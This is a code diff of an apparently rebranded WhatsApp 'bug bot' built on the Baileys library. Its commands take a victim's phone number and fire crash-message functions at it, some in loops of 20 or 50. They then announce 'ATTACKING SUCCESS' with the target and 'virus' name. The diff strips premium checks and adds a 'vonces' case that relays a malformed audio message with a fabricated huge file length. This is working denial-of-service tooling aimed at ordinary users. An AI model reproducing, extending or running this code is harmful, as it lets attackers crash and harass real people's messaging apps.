@@ -7237,15 +9879,14 @@ break
 			}
 			break
 			case 'trashloc': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Trash Number_\n_Example : Trash 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Trash Number_\n_Example : Trash 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Trash Number_\n_Example : Trash 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Trash Number_\n_Example : Trash 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -7253,9 +9894,9 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 1; i++) {
-						await InVisiLocNull(X, null, GetSuZo, Ptcp = true)
-						await InVisiLoc(X, GetSuZo, Ptcp = true)
-						await InVisiLocXz(X, GetSuZo, Ptcp = true)
+						await InVisiLocNull(X, null, GetSuZo, Ptcp = false)
+						await InVisiLoc(X, GetSuZo, Ptcp = false)
+						await InVisiLocXz(X, GetSuZo, Ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -7271,7 +9912,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -7282,7 +9923,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗟𝗢𝗖 𝗫 𝗦𝗤𝗟`,
@@ -7299,7 +9940,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": "{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}"
+											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
 										}, ],
 									})
 								})
@@ -7314,16 +9955,56 @@ break
 				}
 			}
 			break
-			case 'zetsu': {
-				if (!isPremium) return zreply(mess.premium)
+			case 'vonces': {
+				let anjay = {
+					"ephemeralMessage": {
+						"message": {
+							"audioMessage": {
+								"url": "https://mmg.whatsapp.net/v/t62.7117-24/40295592_1440284099910180_5236101920520008108_n.enc?ccb=11-4&oh=01_Q5AaIODSY1cr3J5Hb2iBkt9QxhDAeaREGHD7bJhLv3X2JWHA&oe=67109905&_nc_sid=5e03e0&mms3=true",
+								"mimetype": "audio/mpeg",
+								"fileSha256": "uhiWhrrcbXMrzSk8XzRjt8bgWtabKobbQqJ2vHIQRII=",
+								"fileLength": 9999999999,
+								"seconds": null,
+								"ptt": true,
+								viewOnce: true,
+								"mediaKey": "8BGDt219Jvs0rnoRs6oR75B4qgozG7ZNHbxKk3/69/g=",
+								"directPath": "/v/t62.7117-24/40295592_1440284099910180_5236101920520008108_n.enc?ccb=11-4&oh=01_Q5AaIODSY1cr3J5Hb2iBkt9QxhDAeaREGHD7bJhLv3X2JWHA&oe=67109905&_nc_sid=5e03e0",
+								"mediaKeyTimestamp": "1726554124",
+								contextInfo: {
+									isForwarded: true,
+									forwardedNewsletterMessageInfo: {
+										newsletterJid: "120989263814683954@newsletter",
+										serverMessageId: 1,
+										newsletterName: "⊣ ɖ ɛ Ꮙ Ꮎ ֆ ɨ x 𝙲 Ꮎ ʀ ɛ ⊛"
+									},
+									externalAdReply: {
+										showAdAttribution: false,
+										renderLargerThumbnail: false,
+										title: "Whay",
+										body: "kubyuk",
+										previewType: "VIDEO",
+										thumbnail: TheZhiro,
+										sourceUrl: "https://youtube.com/PakTzy",
+										mediaUrl: "https://youtube.com/PakTzy"
+									}
+								},
+								"waveform": "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
+							}
+						}
+					}
+				}
+				VxoZap.relayMessage(m.chat, anjay, {})
+			}
+			break
+			case 'zetsuu': {
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Xbec Number_\n_Example : Xbec 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Xbug Number_\n_Example : Xbug 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Xbec Number_\n_Example : Xbec 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Xbug Number_\n_Example : Xbug 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -7331,9 +10012,9 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 1; i++) {
-						await ZnXIvS(X, Ptcp = true)
+						await ZnXIvS(X, Ptcp = false)
 						await Gsz(X, GSZ)
-						await ZnXIvS(X, Ptcp = true)
+						await ZnXIvS(X, Ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -7349,7 +10030,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -7360,7 +10041,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝗮𝗿𝗼𝘂𝘀𝗲𝗹 𝗦𝘁𝗶𝗰𝗸𝗲𝗿`,
@@ -7377,7 +10058,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": "{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}"
+											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
 										}, ],
 									})
 								})
@@ -7393,15 +10074,14 @@ break
 			}
 			break
 			case 'tedex': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Tedex Number_\n_Example : Tedex 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Tedex Number_\n_Example : Tedex 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Tedex Number_\n_Example : Tedex 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Tedex Number_\n_Example : Tedex 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -7409,9 +10089,9 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 1; i++) {
-						await ZnXIvS(X, Ptcp = true)
+						await ZnXIvS(X, Ptcp = false)
 						await Tedex(X, dottm)
-						await ZnXIvS(X, Ptcp = true)
+						await ZnXIvS(X, Ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -7427,7 +10107,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -7438,7 +10118,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝗮𝗿𝗼𝘂𝘀𝗲𝗹 𝗠𝗲𝘀𝘀𝗮𝗴𝗲`,
@@ -7455,7 +10135,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": "{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}"
+											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
 										}, ],
 									})
 								})
@@ -7471,15 +10151,14 @@ break
 			}
 			break
 			case 'overflow': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : OverFlow Number_\n_Example : OverFlow 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : OverFlow Number_\n_Example : OverFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : OverFlow Number_\n_Example : OverFlow 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : OverFlow Number_\n_Example : OverFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -7487,11 +10166,11 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 1; i++) {
-						await GlX(X, Ptcp = true)
-						await StuckNull(X, GetsuZo, Ptcp = true)
+						await GlX(X, Ptcp = false)
+						await StuckNull(X, GetsuZo, Ptcp = false)
 					}
 					for (let i = 0; i < 20; i++) {
-						await TrashSystem(X, GetsuZo, Ptcp = true)
+						await TrashSystem(X, GetsuZo, Ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -7507,7 +10186,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -7518,7 +10197,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗢𝗩𝗘𝗥 𝗙𝗟𝗢𝗪`,
@@ -7535,7 +10214,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"Flowinfinite ${incTarget}\"}`
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"Flowinfinite ${incTarget}\"}`
 										}, ],
 									})
 								})
@@ -7551,15 +10230,14 @@ break
 			}
 			break
 			case 'flowinfinite': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Flowinfinite Number_\n_Example : Flowinfinite 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Flowinfinite Number_\n_Example : Flowinfinite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Flowinfinite Number_\n_Example : Flowinfinite 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Flowinfinite Number_\n_Example : Flowinfinite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -7567,7 +10245,7 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 50; i++) {
-						await TrashSystem(X, GetsuZo, Ptcp = true)
+						await TrashSystem(X, GetsuZo, Ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -7583,7 +10261,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -7594,7 +10272,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗙𝗟𝗢𝗪 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘`,
@@ -7611,7 +10289,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}`
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
 										}, ],
 									})
 								})
@@ -7627,15 +10305,14 @@ break
 			}
 			break
 			case 'crashflow': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : CrashFlow Number_\n_Example : CrashFlow 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : CrashFlow Number_\n_Example : CrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : CrashFlow Number_\n_Example : CrashFlow 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : CrashFlow Number_\n_Example : CrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -7643,15 +10320,15 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 1; i++) {
-						await GlX(X, Ptcp = true)
-						await StuckNull(X, GetsuZo, Ptcp = true)
+						await GlX(X, Ptcp = false)
+						await StuckNull(X, GetsuZo, Ptcp = false)
 					}
 					for (let i = 0; i < 20; i++) {
-						await TrashSystem(X, GetsuZo, Ptcp = true)
+						await TrashSystem(X, GetsuZo, Ptcp = false)
 					}
 					for (let i = 0; i < 1; i++) {
-						await ClPm(X, GetsuZo, cct = true, ptcp = true)
-						await InVisiXz(X, GetsuZo, cct = true, ptcp = true)
+						await ClPm(X, GetsuZo, cct = false, ptcp = false)
+						await InVisiXz(X, GetsuZo, cct = false, ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -7667,7 +10344,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -7678,7 +10355,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊⭑̤`,
@@ -7695,7 +10372,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": "{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}"
+											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
 										}, ],
 									})
 								})
@@ -7711,15 +10388,14 @@ break
 			}
 			break
 			case 'suxo': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Suxo Number_\n_Example : Suxo 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Suxo Number_\n_Example : Suxo 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Suxo Number_\n_Example : Suxo 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Suxo Number_\n_Example : Suxo 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -7727,12 +10403,12 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 1; i++) {
-						await ZnX(X, "P", 1020000, Ptcp = true)
-						await ClPmNull(X, null, GetsuZo, cct = true, ptcp = true)
-						await ClPmNull(X, null, GetsuZo, cct = true, ptcp = true)
-						await ZnX(X, nick.sss, 350000, Ptcp = true)
-						await ZnX(X, nick.sss, 800000, Ptcp = true)
-						await ZnX(X, nick.sss, 800000, Ptcp = true)
+						await ZnX(X, "P", 1020000, Ptcp = false)
+						await ClPmNull(X, null, GetsuZo, cct = false, ptcp = false)
+						await ClPmNull(X, null, GetsuZo, cct = false, ptcp = false)
+						await ZnX(X, nick.sss, 350000, Ptcp = false)
+						await ZnX(X, nick.sss, 800000, Ptcp = false)
+						await ZnX(X, nick.sss, 800000, Ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -7748,7 +10424,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -7759,7 +10435,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
